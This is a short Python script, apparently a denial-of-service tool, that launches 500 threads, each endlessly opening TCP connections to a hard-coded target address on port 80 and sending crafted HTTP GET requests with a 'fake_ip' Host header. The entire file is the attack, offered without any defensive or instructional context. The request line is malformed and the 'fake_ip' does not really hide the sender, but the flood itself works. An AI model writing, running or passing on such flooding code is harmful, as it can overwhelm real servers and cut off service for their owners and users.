import threading
import socket

target = '192.168.1.1'
port = 80
fake_ip = '10.24.20.22'

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto((f"GET /{target}" + "HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto((f"Host: {fake_ip}" + "\r\n\r\n").encode('ascii'), (target,port))
        s.close()
        
        global already_connected
        already_connected += 1
        if already_connected % 5000 == 0: print(already_connected)
        
for _ in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
